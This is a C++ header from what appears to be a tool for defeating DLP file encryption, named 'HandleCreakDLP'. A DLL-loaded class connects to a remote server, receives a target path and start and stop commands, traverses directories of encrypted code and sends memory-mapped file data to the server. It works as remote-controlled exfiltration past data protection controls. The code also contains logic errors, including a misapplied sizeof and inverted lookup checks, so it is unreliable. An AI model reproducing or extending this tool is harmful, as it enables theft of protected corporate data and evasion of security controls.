#pragma once
/***************************************************************************************************
* 1、 File       ： HandleCreakDLP.h
* 2、 Version    ： *.*
* 3、 Description： 解密处理操作类
* 4、 Author     ： RG (http://www.9cpp.com/)
* 5、 Created    ： 2013-7-24 17:41:51
* 6、 History    ： 
* 7、 Remark     ： 
****************************************************************************************************/
#include <tchar.h>
#include "TraceUtil.h"
#include "comm_protocol.h"
#include "safestl.h"
//#include "NPipe.h"
#include "DirectoryTraversalFile.h"

#include "SocketClientHelper.h"

class CHandleCreakDLP
{
public:

	CHandleCreakDLP(void)
	{
		Reset();
		//_asm int 3;
		m_clsSocketClientHelper.Open();
		
	}

	~CHandleCreakDLP(void)
	{
		Reset();
		m_clsSocketClientHelper.Close();
	}

	bool HandleMessage()
	{
		//::MessageBox(NULL, "DLL已经加载", "SendFile", MB_OK);
		TRACE(_T("Client - DLL已经加载\r\n"));
		QueueUserWorkItem((LPTHREAD_START_ROUTINE)SendMessageProc, (LPVOID)this, WT_EXECUTELONGFUNCTION);
		m_bExitFlag = true;
		while(m_bExitFlag)
		{
			Recv();			
			Sleep(100);
		}

		TRACE(_T("Client - HandleMessage 线程执行完毕!!!\r\n"));
		return true;		
	}
	//两个线程 一个遍历目录
	//一个接收服务消息

private:
	static UINT WINAPI SendMessageProc( LPVOID lpThreadParameter)
	{
		CHandleCreakDLP* pclsHandleCreakDLP = (CHandleCreakDLP*)lpThreadParameter;

		while(pclsHandleCreakDLP->m_bExitFlag)
		{
			if (pclsHandleCreakDLP->m_clsSocketClientHelper.CheckConnect())
			{				
				pclsHandleCreakDLP->SendMemSharePacket();
			}		
			else
			{
				TRACE(_T("Client - 连接服务器连接失败2！！！\r\n"));
			}
			Sleep(100);
		}

		TRACE(_T("Client - SendMessageProc 线程执行完毕!!!\r\n"));
		return 1;
	}

	bool StartHandleCreakDLP()
	{
		//_asm int 3;
		RG::TRACE(_T("*收到启动命令*\r\n"));
		m_clsDirTraversal.Start(m_tszECodePath);
		return true;
	}

	bool StopHandleCreakDLP()
	{
		RG::TRACE(_T("*收到停止命令*\r\n"));
		//停止线程
		m_clsDirTraversal.stop();
		m_bExitFlag = false;
		return true;
	}

	//接收数据
	int Recv()
	{
		//_asm int 3;
		DATAPACKET stuDataPacket;
		stuDataPacket.Reset();
		stuDataPacket.pstuDataHead->Reset();

		int iReadLen = m_clsSocketClientHelper.Recv((PBYTE)stuDataPacket.pstuDataHead, sizeof(DATAHEAD));
		if (!iReadLen) return iReadLen;
		iReadLen = m_clsSocketClientHelper.Recv(stuDataPacket.szbyData+sizeof(DATAHEAD), stuDataPacket.pstuDataHead->dwPacketLen-sizeof(DATAHEAD));
		if (!iReadLen) return iReadLen;
//_asm int 3;
		RG::TRACE(_T("*****收到服务器消息*****\r\n"));
		RG::TRACE(_T("包类型:0x%X;包长度:%d\r\n"), stuDataPacket.pstuDataHead->dwPacketType, stuDataPacket.dwBufLen);
		//服务器地址下发消息
		if (TYPE_PACKET_PATH == stuDataPacket.pstuDataHead->dwPacketType)
		{
			_tcscpy_s(m_tszECodePath, MAX_PATH, (TCHAR*)(stuDataPacket.szbyData+sizeof(DATAHEAD)));
			RG::TRACE(_T("Path:%s\r\n"), m_tszECodePath);
		}

		//服务器命令包下发消息
		if (TYPE_PACKET_COMMAND == stuDataPacket.pstuDataHead->dwPacketType)
		{
			bool bRet = true;
			COMMAND stuCommand = {0};
			memcpy(&stuCommand, stuDataPacket.szbyData+sizeof(DATAHEAD), sizeof(stuDataPacket.pstuDataHead->dwPacketLen-sizeof(DATAHEAD)));
			switch(stuCommand.iCommand)
			{
			case COMMAND_START:
				bRet = StartHandleCreakDLP();break;
			case COMMAND_STOP:
				bRet = StopHandleCreakDLP();break;
			//以下三种暂时不处理
			case COMMAND_PAUSE:break;
			case COMMAND_CONTINUE:break;
			case COMMAND_EXIT: break;
			}

			SendReplay(stuDataPacket.pstuDataHead->dwSerialNo, TYPE_OK);   //发送回复
		}

		//文件映射消息回复 
		if (TYPE_PACKET_REPLAY_MEMSHARE == stuDataPacket.pstuDataHead->dwPacketType)
		{
			RG::TRACE(_T("*收到文件映射消息回复*\r\n"));
			HandleReplay(stuDataPacket.pstuDataHead->dwSerialNo, stuDataPacket.pstuDataHead->dwReturn);
		}
		return iReadLen;
	}

	//回复文件映射数据包
	DWORD SendReplay(const DWORD dwSerialNo = 0, const DWORD dwReturn = 0)
	{
		return SendData(TYPE_PACKET_REPLAY_COMMAND, NULL, 0, dwSerialNo, dwReturn);
	}

	//发送数据
	DWORD SendData(const int iMessageType, const PBYTE pbyInDateBuf = NULL, const int iBufLen = 0, const DWORD dwSerialNo = 0, const DWORD dwReturn = 0)
	{
		DWORD dwRet = 0;
		DATAPACKET stuPacket;
		stuPacket.pstuDataHead->dwPacketType = iMessageType;
		stuPacket.pstuDataHead->dwReturn = dwReturn;
		
		if (dwSerialNo)
		{
			stuPacket.pstuDataHead->dwSerialNo = dwSerialNo;			
		}
		else
		{
			stuPacket.pstuDataHead->dwSerialNo = m_dwSerialNo;			
		}		

		if (iBufLen)
		{
			memcpy(stuPacket.szbyData+stuPacket.dwBufLen, pbyInDateBuf, iBufLen);
			stuPacket.dwBufLen += iBufLen;
		}

		stuPacket.pstuDataHead->dwPacketLen = stuPacket.dwBufLen;

		dwRet =  m_clsSocketClientHelper.Send(stuPacket.szbyData, stuPacket.pstuDataHead->dwPacketLen);

		if (dwSerialNo && dwRet)
		{
			SavePacket(m_dwSerialNo, stuPacket);
			m_dwSerialNo++;
		}
		return dwRet;
	}

	bool SendMemSharePacket()
	{
		bool bRet = false;;
		MEMSHAREINFO stuMemShareInfo;
		stuMemShareInfo.Reset();
		
		if (m_clsDirTraversal.GetMemShareInfo(&stuMemShareInfo))
		{
			TRACE(_T("Client - 发送文件映射信息！！！\r\n"));
			bRet = SendData(TYPE_PACKET_MEMSHARE, (PBYTE)&stuMemShareInfo, sizeof(MEMSHAREINFO));
		}	
		return bRet;
	}

	//处理文件映射回复数据包
	bool HandleReplay(DWORD dwSerialNo, DWORD dwReturn)
	{
		//
		if (TYPE_ERROR == dwReturn)
		{
			RG::TRACE(_T("*收到错误数据包重发数据*\r\n"));
			return (RepeatPacket(dwSerialNo)>0?true:false);			
		}
		else
		{
			m_mapSerialNoPacket.Lock();
			if (0 != m_mapSerialNoPacket.count(dwSerialNo))
			{
				m_mapSerialNoPacket.Unlock();
				return 0;
			}

			DATAPACKET stuPacket = m_mapSerialNoPacket[dwSerialNo];
			m_mapSerialNoPacket.Unlock();

			PMEMSHAREINFO pstuMemShareInfo = (PMEMSHAREINFO)(stuPacket.szbyData+sizeof(DATAHEAD));
			if (pstuMemShareInfo)
			{
				m_clsDirTraversal.CloseMemShare(std::string(pstuMemShareInfo->stuFileInfo.tszFilePath));
			}			
		}
		//如果 是正确数据包则需要解除文件映射
	}

	//重发数据
	DWORD RepeatPacket(DWORD dwSerialNo)
	{
		m_mapSerialNoPacket.Lock();
		if (0 != m_mapSerialNoPacket.count(dwSerialNo))
		{
			m_mapSerialNoPacket.Unlock();
			return 0;
		}

		DATAPACKET stuPacket = m_mapSerialNoPacket[dwSerialNo];
		m_mapSerialNoPacket.Unlock();
		return  m_clsSocketClientHelper.Send(stuPacket.szbyData, stuPacket.pstuDataHead->dwPacketLen);
	}

	void SavePacket(DWORD dwSerialNo, DATAPACKET& stuPacket)
	{
		m_mapSerialNoPacket.Lock();
		if (0 == m_mapSerialNoPacket.count(dwSerialNo))
		{
			m_mapSerialNoPacket[dwSerialNo] = stuPacket;
		}
		m_mapSerialNoPacket.Unlock();
	}

	void Reset()
	{
		m_dwSerialNo = 0;
		m_bExitFlag = false;		
		memset(m_tszECodePath, 0, MAX_PATH*sizeof(TCHAR));
		m_mapSerialNoPacket.Lock();
		m_mapSerialNoPacket.clear();
		m_mapSerialNoPacket.Unlock();
	}

private:
	CDirTraversal                           m_clsDirTraversal;             //遍历目录
	CSocketClientHelper                     m_clsSocketClientHelper;
	bool                                    m_bExitFlag;                   //线程退出标志
	DWORD                                   m_dwSerialNo;                  //流水号
	TCHAR                                   m_tszECodePath[MAX_PATH];      //加密代码路径
	RG::SAFESTL::CMap<DWORD, DATAPACKET>    m_mapSerialNoPacket;           //流水号与数据包对应 map
};
